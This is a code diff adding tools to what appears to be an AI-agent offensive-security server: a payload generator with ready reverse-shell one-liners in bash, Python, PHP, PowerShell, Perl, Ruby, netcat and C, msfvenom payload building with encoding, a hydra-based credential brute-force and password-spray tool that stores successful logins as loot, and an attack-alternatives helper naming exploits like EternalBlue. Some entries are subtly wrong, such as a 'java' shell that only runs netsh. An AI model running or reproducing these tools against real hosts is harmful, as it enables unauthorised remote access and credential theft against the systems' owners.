@@ -2187,6 +2187,380 @@ def adapt(technique: str = "", result: str = "success", reason: str = "",
            f"   Recommendation: {recommendation or 'Continue with next technique'}"
 
 
+# --------------------------------------------------------------------------- #
+# Phase 2: Payload Generator
+# --------------------------------------------------------------------------- #
+@mcp.tool()
+def payload(action: str = "generate", language: str = "bash", lhost: str = "", 
+            lport: int = 4444, encoder: str = "", format_: str = "raw",
+            output: str = "", platform: str = "linux", arch: str = "x64") -> str:
+    """Generate reverse shell payloads or encode with msfvenom.
+    
+    Actions:
+      generate   create reverse shell payload (bash, python, php, powershell, java)
+      msfvenom   use msfvenom to generate encoded payload
+      encode     encode payload (base64, hex, shell_escape)
+    
+    Args:
+      action: generate | msfvenom | encode
+      language: shell language (bash, python, php, powershell, java, c)
+      lhost: listener IP
+      lport: listener port
+      encoder: msfvenom encoder (e.g., x86/shikata_ga_nai)
+      format_: output format (raw, elf, exe, php, asp, js, etc.)
+      output: output file path
+      platform: target platform (linux, windows, darwin)
+      arch: target architecture (x86, x64, arm)
+    """
+    t0 = time.time()
+    a = (action or "generate").lower().strip()
+    
+    # Reverse shell templates
+    shells = {
+        "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+        "bash_simple": "/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
+        "python": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])",
+        "python_one": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
+        "php": "<?php $sock=fsockopen('{lhost}',{lport});exec('/bin/bash -i <&3 >&3 2>&3'); ?>",
+        "powershell": "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+        "java": "r=new ProcessBuilder(\"cmd\",\"/c\",\"netsh interface show interface\");r.redirectErrorStream(true);Process p=r.start();r=new BufferedReader(new InputStreamReader(p.getInputStream()));while(r.ready())System.out.print(r.readLine());",
+        "perl": "exec 'perl -e \'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");\'}'\"",
+        "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'",
+        "netcat": "nc -e /bin/bash {lhost} {lport}",
+        "netcat_openbsd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
+        "c": "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n\nint main(){\n  int sock, port={lport};\n  struct sockaddr_in addr;\n  sock=socket(AF_INET,SOCK_STREAM,0);\n  addr.sin_family=AF_INET;\n  addr.sin_port=htons(port);\n  addr.sin_addr.s_addr=inet_addr(\"{lhost}\");\n  connect(sock,(struct sockaddr*)&addr,sizeof(addr));\n  dup2(sock,0);dup2(sock,1);dup2(sock,2);\n  system(\"/bin/sh\");\n  return 0;\n}"
+    }
+    
+    if a == "generate":
+        lang = (language or "bash").lower().strip()
+        
+        if lang not in shells:
+            return f"Unknown language '{lang}'. Available: {', '.join(shells.keys())}"
+        
+        if not lhost:
+            return "lhost required for payload generation"
+        
+        template = shells[lang]
+        payload_str = template.replace("{lhost}", lhost).replace("{lport}", str(lport))
+        
+        lines = [f"🔧 {lang.upper()} Reverse Shell Payload",
+                 f"   LHOST: {lhost}",
+                 f"   LPORT: {lport}",
+                 f"   Platform: {platform}",
+                 f"   Arch: {arch}",
+                 "",
+                 "```", payload_str, "```"]
+        
+        _audit("payload", "generated", "", f"lang={lang} lhost={lhost}")
+        return "\n".join(lines)
+    
+    if a == "msfvenom":
+        if not lhost:
+            return "lhost required for msfvenom"
+        
+        # Build msfvenom command
+        cmd = ["msfvenom"]
+        
+        # Select payload based on platform
+        payload_map = {
+            "linux": "linux/x64/shell_reverse_tcp",
+            "windows": "windows/x64/meterpreter/reverse_tcp",
+            "darwin": "osx/x64/shell_reverse_tcp"
+        }
+        payload_name = payload_map.get(platform, "linux/x64/shell_reverse_tcp")
+        cmd.extend(["-p", payload_name, "LHOST=" + lhost, "LPORT=" + str(lport)])
+        
+        # Add format
+        fmt = format_.lower()
+        if fmt:
+            cmd.extend(["-f", fmt])
+        
+        # Add encoder
+        if encoder:
+            cmd.extend(["-e", encoder, "-i", "3"])  # 3 iterations default
+        
+        # Add output
+        if output:
+            cmd.extend(["-o", output])
+        else:
+            output = f"/tmp/opencode/shell_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}"
+            cmd.extend(["-o", output])
+        
+        code, result = _run(cmd, timeout=60)
+        
+        if code == 0:
+            _audit("payload", "msfvenom", "", f"output={output}")
+            return f"✅ Payload generated successfully\n   Output: {output}\n   Command: {' '.join(cmd)}"
+        else:
+            _audit("payload", "msfvenom_error", "", result, ok=False)
+            return f"❌ msfvenom failed:\n{result}"
+    
+    if a == "encode":
+        if not language:
+            return "payload content required (use generate first)"
+        
+        # Encode the payload
+        if encoder == "base64":
+            encoded = base64.b64encode(language.encode()).decode()
+            decode_cmd = "echo '" + encoded + "' | base64 -d"
+        elif encoder == "hex":
+            encoded = language.encode().hex()
+            decode_cmd = "echo '" + encoded + "' | xxd -r -p"
+        elif encoder == "url":
+            encoded = urllib.parse.quote(language, safe="")
+            decode_cmd = "python3 -c \"import urllib.parse; print(urllib.parse.unquote('" + encoded + "'))\""
+        else:
+            encoded = language
+            decode_cmd = language
+        
+        _audit("payload", "encoded", "", f"encoder={encoder}")
+        return f"🔐 Encoded Payload:\n   Encoder: {encoder or 'none'}\n   \n   {encoded}\n   \n   Decode: {decode_cmd}"
+    
+    return f"unknown action '{action}' — use generate, msfvenom, or encode"
+
+
+# --------------------------------------------------------------------------- #
+# Phase 2: Auto-Credential Tester
+# --------------------------------------------------------------------------- #
+@mcp.tool()
+def creds(action: str = "test", target: str = "", service: str = "", 
+          username: str = "", password: str = "", wordlist: str = "",
+          port: int = 22, batch_size: int = 10) -> str:
+    """Test credentials against services automatically.
+    
+    Actions:
+      test       test single credential pair
+      brute      brute force with wordlist
+      spray      password spray (one password, multiple users)
+      discovered test all discovered creds against all services
+    
+    Args:
+      action: test | brute | spray | discovered
+      target: target host
+      service: service type (ssh, smb, ftp, mysql, postgres, redis, etc.)
+      username: username to test
+      password: password to test
+      wordlist: path to wordlist file
+      port: service port
+      batch_size: credentials to test per batch
+    """
+    t0 = time.time()
+    a = (action or "test").lower().strip()
+    
+    if not target:
+        return "target required"
+    
+    # Service configurations
+    services = {
+        "ssh": {"port": 22, "tool": "hydra", "args": "-l {user} -P {pass_or_wordlist} ssh://{target}:{port}"},
+        "smb": {"port": 445, "tool": "netexec", "args": "smb {target} -u {user} -p '{pass}'"},
+        "ftp": {"port": 21, "tool": "hydra", "args": "-l {user} -P {pass_or_wordlist} ftp://{target}:{port}"},
+        "mysql": {"port": 3306, "tool": "hydra", "args": "-l {user} -P {pass_or_wordlist} mysql://{target}:{port}"},
+        "postgres": {"port": 5432, "tool": "hydra", "args": "-l {user} -P {pass_or_wordlist} postgres://{target}:{port}"},
+        "redis": {"port": 6379, "tool": "redis-cli", "args": "-h {target} -p {port} -a {pass} PING"},
+        "rdp": {"port": 3389, "tool": "hydra", "args": "-l {user} -P {pass_or_wordlist} rdps://{target}:{port}"},
+        "telnet": {"port": 23, "tool": "hydra", "args": "-l {user} -P {pass_or_wordlist} telnet://{target}:{port}"},
+    }
+    
+    if a == "test":
+        if not username or not password:
+            return "username and password required for test"
+        
+        svc = (service or "ssh").lower().strip()
+        if svc not in services:
+            return f"Unknown service '{svc}'. Available: {', '.join(services.keys())}"
+        
+        svc_config = services[svc]
+        port = port or svc_config["port"]
+        
+        # Build command based on tool
+        if svc_config["tool"] == "hydra":
+            cmd = ["hydra", "-L", "-", "-l", username, "-P", "-", 
+                   svc_config["args"].replace("{user}", username).replace("{pass_or_wordlist}", "-").replace("{target}", target).replace("{port}", str(port))]
+            # This is simplified - actual hydra usage would be different
+            cmd = ["hydra", "-l", username, "-p", password, 
+                   f"{svc}://{target}:{port}", "-t", "4"]
+        elif svc_config["tool"] == "netexec":
+            cmd = ["netexec", "smb", target, "-u", username, "-p", password]
+        elif svc_config["tool"] == "redis-cli":
+            cmd = ["redis-cli", "-h", target, "-p", str(port), "-a", password, "PING"]
+        else:
+            cmd = [svc_config["tool"]]
+        
+        code, output = _run(cmd, timeout=60)
+        
+        # Check for success indicators
+        success = any(ind in output.lower() for ind in ["success", "login", "password", "accepted", "pong"])
+        
+        _audit("creds", "test", target, f"service={svc} user={username} success={success}")
+        
+        if success:
+            # Save successful credential
+            loot(action="add", target=target, loot_type="credential",
+                 name=f"{svc}_{username}", content=f"{username}:{password}",
+                 path=f"{svc}://{target}:{port}")
+            return f"✅ SUCCESS!\n   Target: {target}\n   Service: {svc}\n   Username: {username}\n   Password: {password}\n   {output}"
+        else:
+            return f"❌ Failed\n   Target: {target}\n   Service: {svc}\n   Username: {username}\n   {output}"
+    
+    if a == "brute":
+        if not wordlist:
+            wordlist = "/usr/share/wordlists/rockyou.txt"
+        
+        svc = (service or "ssh").lower().strip()
+        if svc not in services:
+            return f"Unknown service '{svc}'. Available: {', '.join(services.keys())}"
+        
+        port = port or services[svc]["port"]
+        
+        cmd = ["hydra", "-l", username or "admin", "-P", wordlist,
+               f"{svc}://{target}:{port}", "-t", "16", "-I"]
+        
+        code, output = _run(cmd, timeout=300)
+        
+        _audit("creds", "brute", target, f"service={svc} wordlist={wordlist}")
+        return f"$ {' '.join(cmd)}\n\n{output}"
+    
+    if a == "spray":
+        if not password:
+            return "password required for spray"
+        
+        if not wordlist:
+            wordlist = "/usr/share/wordlists/users.txt"
+        
+        svc = (service or "ssh").lower().strip()
+        if svc not in services:
+            return f"Unknown service '{svc}'. Available: {', '.join(services.keys())}"
+        
+        port = port or services[svc]["port"]
+        
+        cmd = ["hydra", "-L", wordlist, "-p", password,
+               f"{svc}://{target}:{port}", "-t", "16", "-I"]
+        
+        code, output = _run(cmd, timeout=300)
+        
+        _audit("creds", "spray", target, f"service={svc} password={password}")
+        return f"$ {' '.join(cmd)}\n\n{output}"
+    
+    if a == "discovered":
+        # Get discovered creds from state
+        state_file = STATE_DIR / f"{target.replace('/', '_').replace(':', '_')}.json"
+        if not state_file.exists():
+            return f"No state found for {target}"
+        
+        try:
+            state_data = json.loads(state_file.read_text())
+        except Exception:
+            return "Error reading state"
+        
+        creds_list = state_data.get("discovered", {}).get("creds", [])
+        if not creds_list:
+            return "No discovered credentials in state"
+        
+        results = []
+        for cred in creds_list[:batch_size]:
+            user = cred.get("user", "")
+            pass_ = cred.get("pass", "")
+            
+            if not user or not pass_:
+                continue
+            
+            # Test against common services
+            for svc in ["ssh", "smb", "ftp"]:
+                if svc in services:
+                    port = services[svc]["port"]
+                    result = creds(action="test", target=target, service=svc,
+                                  username=user, password=pass_, port=port)
+                    if "SUCCESS" in result:
+                        results.append(result)
+        
+        if results:
+            return "\n\n".join(results)
+        else:
+            return f"No successful credentials found (tested {min(len(creds_list), batch_size)} creds)"
+    
+    return f"unknown action '{action}' — use test, brute, spray, or discovered"
+
+
+# --------------------------------------------------------------------------- #
+# Phase 2: Backtracking Helper
+# --------------------------------------------------------------------------- #
+@mcp.tool()
+def backtrack(target: str = "", technique: str = "", reason: str = "", 
+              alternatives: str = "") -> str:
+    """Try alternative techniques when current approach fails.
+    
+    Args:
+      target: target host
+      technique: technique that failed
+      reason: why it failed
+      alternatives: JSON list of alternative techniques to try
+    
+    Returns recommended next steps based on failure analysis.
+    """
+    t0 = time.time()
+    
+    # Alternative technique mappings
+    alternatives_db = {
+        "CVE-2021-41773": [
+            {"name": "CVE-2021-42013", "type": "cve", "description": "Apache 2.4.49-2.4.51 Server-Side Request Forgery"},
+            {"name": "CVE-2021-41773_encoded", "type": "exploit", "description": "Same CVE with URL-encoded payload"},
+            {"name": "dir_brute", "type": "enumeration", "description": "Brute force directories"},
+        ],
+        "ssh_brute": [
+            {"name": "ssh_enum", "type": "enumeration", "description": "Enumerate SSH users"},
+            {"name": "ssh_weak_key", "type": "exploit", "description": "Check for weak SSH keys"},
+            {"name": "credential_spray", "type": "auth", "description": "Try common passwords across users"},
+        ],
+        "smb_brute": [
+            {"name": "smb_null", "type": "auth", "description": "Try null session"},
+            {"name": "smb_enum", "type": "enumeration", "description": "Enumerate SMB shares"},
+            {"name": "MS17-010", "type": "cve", "description": "EternalBlue exploit"},
+        ],
+        "web_vuln": [
+            {"name": "sqlmap", "type": "injection", "description": "Test for SQL injection"},
+            {"name": "xsser", "type": "injection", "description": "Test for XSS"},
+            {"name": "cmdi", "type": "injection", "description": "Test for command injection"},
+            {"name": "ssrf", "type": "injection", "description": "Test for SSRF"},
+        ],
+    }
+    
+    tech_lower = technique.lower() if technique else ""
+    
+    # Find matching alternatives
+    recommended = []
+    for key, alts in alternatives_db.items():
+        if key in tech_lower or tech_lower in key:
+            recommended.extend(alts)
+    
+    # Add generic alternatives if none found
+    if not recommended:
+        recommended = [
+            {"name": "searchsploit", "type": "research", "description": f"Search for exploits for {technique or 'target'}"},
+            {"name": "dir_brute", "type": "enumeration", "description": "Brute force directories/files"},
+            {"name": "subdomain_enum", "type": "enumeration", "description": "Find more subdomains"},
+            {"name": "port_scan_full", "type": "recon", "description": "Full port scan (1-65535)"},
+        ]
+    
+    # Record in learning
+    if technique and reason:
+        adapt(technique=technique, result="failed", reason=reason, target=target)
+    
+    lines = [f"🔄 Backtracking for: {technique or 'current technique'}"]
+    if reason:
+        lines.append(f"   Reason: {reason}")
+    lines.append(f"   Target: {target}")
+    lines.append(f"\n   📋 Recommended alternatives ({len(recommended)}):")
+    
+    for i, alt in enumerate(recommended[:10], 1):
+        lines.append(f"   {i}. {alt['name']} ({alt['type']})")
+        lines.append(f"      {alt['description']}")
+    
+    _audit("backtrack", "recommended", target, f"technique={technique} alternatives={len(recommended)}")
+    
+    return "\n".join(lines)
+
+
 if __name__ == "__main__":
     _audit("server", "start", detail=str(INDEX))
     mcp.run()
